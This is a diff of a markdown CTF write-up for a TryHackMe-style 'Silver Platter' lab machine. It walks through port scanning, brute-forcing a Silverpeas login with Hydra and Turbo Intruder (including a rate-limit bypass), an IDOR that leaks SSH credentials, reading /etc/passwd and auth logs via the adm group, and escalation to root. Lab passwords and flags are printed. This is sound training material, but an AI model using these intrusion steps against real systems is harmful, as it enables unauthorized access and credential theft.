@@ -1,7 +1,7 @@
 # CTF/Machine Info
 ## Context:
 
-![[Pasted image 20250608155709.png|1000]]
+![image](https://github.com/user-attachments/assets/10d92d72-dd66-47f0-af18-b495b25c739a)
 ## IP: 10.10.190.218
 
 - Map IP to `sliverplatter.thm` in `/etc/hosts`.
@@ -9,7 +9,7 @@
 # Scanning
 
 ## Nmap
-
+- Basic port scan to find open ports first.
 ```bash
 nmap -p- -T5 -vv silverplatter.thm
 Scanning 10.10.157.219 [65535 ports]
@@ -17,7 +17,7 @@ Discovered open port 80/tcp on 10.10.190.218
 Discovered open port 8080/tcp on 10.10.190.218
 Discovered open port 22/tcp on 10.10.190.218
 ```
-
+- In-depth port scan to enumerate service information.
 ```bash
 nmap -p 22,80,8080 -A -T5 -vv -Pn silverplatter.thm
 
@@ -96,15 +96,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 # Enumeration
 
 ## FFUF (VHOST)
-
+- No subdomains or virtual hosts found using FFUF.
 ```bash
 ffuf -w /home/n0derunnr/Documents/.wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.example.com" -u http://10.10.190.218
-
-*NO VHOSTS/SUBDOMAINS FOUND*
 ```
 
 ## Gobuster (Forced Browsing)
-
+- Directory busting with gobuster and discover hidden subdirectories and web server files.
 ```bash
 gobuster dir -u http://10.10.190.218 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php,js,json,bak,zip
 
@@ -112,34 +110,33 @@ gobuster dir -u http://10.10.190.218 -w /usr/share/wordlists/dirbuster/directory
 /images
 /assets
 /README.txt
-
+```
+- Forced browsing failed on web server at port 8080: Received error as context deadline exceeded while awaiting headers.
+```bash
 gobuster dir -u http://silverplatter.thm:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php,js,json,bak,zip
-
-ERROR: context deadline exceeded while awaiting headers.
 ```
 
 ## Walking through `http://silverplatter.thm`
 
-![[Pasted image 20250605231317.png|400]]
-- Found searching `http://10.10.190.218`. Hyperlink to `http://10.10.190.218/#contract`.
+![image](https://github.com/user-attachments/assets/2663b9ac-344e-4e08-9461-e9171c3f08f3)
+- Found a username and possible database, platform, or application named "Silverpeas" when searching `http://10.10.190.218`. There is a hyperlink to `http://10.10.190.218/#contract` which displays contact information.
 	- Software: _Silverpeas_
 	- Username: _scr1ptkiddy_
 
 ## Research: Silverpeas
-
-![[Pasted image 20250605233055.png]]
-- Found on installation page for Silverpeas for Docker.
+- After researching the technical documentation on Silverpeas, I found useful host and default login information when installing an instance of Silverpeas.
 - Default access is at `http://localhost:8080/silverpeas`.
-- Sign in with default username and password: _SilverAdmin_
-
-![[Pasted image 20250605233346.png]]
+- Sign in with default username and password: _SilverAdmin
+![image](https://github.com/user-attachments/assets/1ed9748f-c183-4c0d-8fbd-795914fc0378)
+- After going to `http://silverplatter.thm:/8080/silverpeas` a page opened up with a login form. Username "scr1ptkiddy" is probably useful here.
+![image](https://github.com/user-attachments/assets/1ce27f47-7b4a-4786-bd1f-04704f57bffd)
 
 ---
 # Exploitation
 
 ## Password Spraying/Brute Force Authentication
-
-![[Pasted image 20250608092209.png]]
+- In the machine's Context information, we saw that authentication is already tried and protected against rockyou.txt.
+![image](https://github.com/user-attachments/assets/187ce3de-cd2d-427c-a439-13bc62df86ef)
 - Back on the machine's information page, we have context that mentions testing passwords against _rockyou.txt_. This invites me to use a different list rather than rockyou.txt. The machine mentions that's how 'cool' they are in between quotes. Reference to CeWL: a custom wordlist generator that crawls a website, to a configurable depth, and extract key words, email addresses, and metadata.
 
 ```bash
@@ -149,9 +146,9 @@ cewl -w custom_passwords.txt silverplatter.thm
 ### Hydra
 
 - `http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp` could not be cracked with Hydra at the initial effort. 
-	- `defaultLogin.jsp` is not the actual login handler — it’s the **front-end form**, a JSP page rendered to the user. When you submit the form from that page:
-		- It does **not** process authentication itself.
-		- Instead, it sends a POST request to a **backend servlet** (in this case, `AuthenticationServlet`) with `DomainId`, `Login`, and `Password` parameters.
+	- `defaultLogin.jsp` is not the actual login handler — it’s the front-end form, a JSP page rendered to the user. When you submit the form from that page:
+		- It does not process authentication itself.
+		- Instead, it sends a POST request to a backend servlet (in this case, `AuthenticationServlet`) with `DomainId`, `Login`, and `Password` parameters.
 
 Hydra only works when you point it at the **actual backend POST endpoint** where the credentials are validated.
 
@@ -183,24 +180,24 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-08 09:55:
 
 Capturing a login request and sending it to Burp's Repeater tool can be used with the extension "Turbo Intruder" to bypass rate limiting on the community addition. FUZZ the desired parameter with the `%s` characters. Switch payload to basic.py and modify password list payload path.
 
-![[Pasted image 20250608100906.png]]
+![image](https://github.com/user-attachments/assets/4efb8af4-a141-4cb8-85dc-eede15b3ea5a)
 - We see that 'adipiscing' is significantly content length and larger than the other passwords when brute forced. 
 
 ## IDOR Vulnerability
 
 Upon logging into scr1ptkiddy, we have a notification for an unread message. 
 
-![[Pasted image 20250608171358.png]]
+![image](https://github.com/user-attachments/assets/1822054b-da97-453d-8210-c7fefd4e3e5f)
 
 Going into the mailbox and opening the message, we see that the URL has an ID parameter. Can we view other items?
 
-![[Pasted image 20250608104458.png]]
+![image](https://github.com/user-attachments/assets/3b289844-73ab-46ca-a06d-48ad0a2195a8)
 - After copying and pasting the URL in the message into the browser and modifying the ID parameter, we find some interesting things.
 - Starting at ID=1, we see an administrator account. This account is sending messages in French from ID 1-4. ID=5 is the message we have in our current inbox.
 - ID=6 contains SSH credentials for the user `tim`. 
 	- Password: `cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol`.
 
-![[Pasted image 20250608104923.png|600]]
+![image](https://github.com/user-attachments/assets/78cfc870-6ff8-4a23-a076-e38e0545967e)
 
 ## Remote Access to the Web Server
 
@@ -269,35 +266,70 @@ tim@silver-platter:~$
 ```
 - After dumping directory contents of user `tim`, we captured the first flag: `user.txt`.
 
->[!success] 🚩 **FLAG 1**: _THM{c4ca4238a0b923820dcc509a6f75849b}_
+🚩 **FLAG 1**: _THM{c4ca4238a0b923820dcc509a6f75849b}_
 
 ## Sudo Privileges/SUID Binaries
 
-- Checking sudo privileges.
+- Checking sudo privileges. Looks like `tim` is not in the sudoers file...
 ```bash
 tim@silver-platter:~$ sudo -l
 [sudo] password for tim: 
 Sorry, user tim may not run sudo on silver-platter.
 tim@silver-platter:~$ 
 ```
-
 - Finding all binaries with SUID set.
 ```bash
 tim@silver-platter:~$ find / -perm -4000 -type f 2>/dev/null
-/snap/core20/2264/usr/bin/chfn /snap/core20/2264/usr/bin/chsh /snap/core20/2264/usr/bin/gpasswd /snap/core20/2264/usr/bin/mount /snap/core20/2264/usr/bin/newgrp /snap/core20/2264/usr/bin/passwd /snap/core20/2264/usr/bin/su /snap/core20/2264/usr/bin/sudo /snap/core20/2264/usr/bin/umount /snap/core20/2264/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/2264/usr/lib/openssh/ssh-keysign /snap/core20/1974/usr/bin/chfn /snap/core20/1974/usr/bin/chsh /snap/core20/1974/usr/bin/gpasswd /snap/core20/1974/usr/bin/mount /snap/core20/1974/usr/bin/newgrp /snap/core20/1974/usr/bin/passwd /snap/core20/1974/usr/bin/su /snap/core20/1974/usr/bin/sudo /snap/core20/1974/usr/bin/umount /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/1974/usr/lib/openssh/ssh-keysign /snap/snapd/20290/usr/lib/snapd/snap-confine /snap/snapd/19457/usr/lib/snapd/snap-confine /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/bin/chsh /usr/bin/newgrp /usr/bin/fusermount3 /usr/bin/passwd /usr/bin/mount /usr/bin/gpasswd /usr/bin/sudo /usr/bin/su /usr/bin/chfn /usr/bin/pkexec /usr/bin/umount /usr/libexec/polkit-agent-helper-1
+/snap/core20/2264/usr/bin/chfn
+/snap/core20/2264/usr/bin/chsh
+/snap/core20/2264/usr/bin/gpasswd
+/snap/core20/2264/usr/bin/mount
+/snap/core20/2264/usr/bin/newgrp
+/snap/core20/2264/usr/bin/passwd
+/snap/core20/2264/usr/bin/su
+/snap/core20/2264/usr/bin/sudo
+/snap/core20/2264/usr/bin/umount
+/snap/core20/2264/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2264/usr/lib/openssh/ssh-keysign
+/snap/core20/1974/usr/bin/chfn
+/snap/core20/1974/usr/bin/chsh
+/snap/core20/1974/usr/bin/gpasswd
+/snap/core20/1974/usr/bin/mount
+/snap/core20/1974/usr/bin/newgrp
+/snap/core20/1974/usr/bin/passwd
+/snap/core20/1974/usr/bin/su
+/snap/core20/1974/usr/bin/sudo
+/snap/core20/1974/usr/bin/umount
+/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1974/usr/lib/openssh/ssh-keysign
+/snap/snapd/20290/usr/lib/snapd/snap-confine
+/snap/snapd/19457/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/fusermount3
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/pkexec
+/usr/bin/umount
+/usr/libexec/polkit-agent-helper-1
 ```
 
 ## User Account Enumeration:
-
+- We see that `tim` is part of the 'adm' group. It's worth checking to see how this security group operates at default.
 ```bash
 tim@silver-platter:~$ id
 uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
 ```
-- `adm` group may be worth looking into. Do security research on this security group.
-
-![[Pasted image 20250608165510.png]]
 - This immediate response off of Google entices me to see if user `tim` can review logs and see if there is any sensitive and valuable information.
-
+![image](https://github.com/user-attachments/assets/dac21d2c-f00f-4ba5-a005-7679a1cbf3e2)
+- /etc/passwd: Seeing what users are listed, groups, etc. We see `tim` is in a 'adm' group. It's worth checking to see how this security group operates at default.
 ```bash
 tim@silver-platter:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -337,13 +369,12 @@ lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
 tim:x:1001:1001::/home/tim:/bin/bash
 dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/
 ```
-
 - A recognized name from enumerating the website and when going through the IDOR email vulnerability: 
 	- `tyler:x:1000:1000:root:/home/tyler:/bin/bash`
 	- User `tyler` is a lucrative user account to pivot to as they are part of root.
 
 ## Divulging Authentication Info via Logs
-
+- After dumping various authentication logs, we see some possible sensitive information through `auth.log.2`. There are a lot of different logs, but focusing in on the logs owned by `adm` is key:
 ```bash
 tim@silver-platter:~$ cd /var/log
 tim@silver-platter:/var/log$ ls -la
@@ -393,7 +424,8 @@ drwx------   2 root      root              4096 Aug 10  2023 private
 drwxr-x---   2 root      adm               4096 Jun  8 20:40 unattended-upgrades
 -rw-rw-r--   1 root      utmp             26880 Jun  8 20:53 wtmp
 ```
-- After dumping various authentication logs, we see some possible sensitive information through `auth.log.2`:
+- We see user `tyler` going through and updating or setting up new passwords for this silverpeas docker install. Back when I was researching the technical documentation on Silverpeas, I remember the docker run commmand had parameters set up for `DB_NAME`, `DB_USER`, and `DB_PASSWORD`. Upon going through these logs, I was able to search through and find these parameters with the user's input unencrypted.
+	- Password: `_Zd_zx7N823/`.
 ```bash
 tim@silver-platter:/var/log$ cat auth.log.2
 Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
@@ -421,8 +453,6 @@ Dec 13 15:53:35 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/var/www/html ; U
 Dec 13 15:53:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
 Dec 13 15:53:35 silver-platter sudo: pam_unix(sudo:session): session closed for user root
 ```
-- We see user `tyler` going through and updating passwords to various databases.
-	- Password: `_Zd_zx7N823/`.
 
 ## Vertical Escalation
 
@@ -447,8 +477,7 @@ root@silver-platter:/home/tim# cd /root
 root@silver-platter:~# cat root.txt 
 THM{098f6bcd4621d373cade4e832627b4f6}
 ```
-
-> [!success] 🚩 **FLAG 2**: _THM{098f6bcd4621d373cade4e832627b4f6}_
+🚩 **FLAG 2**: _THM{098f6bcd4621d373cade4e832627b4f6}_
 
 
 
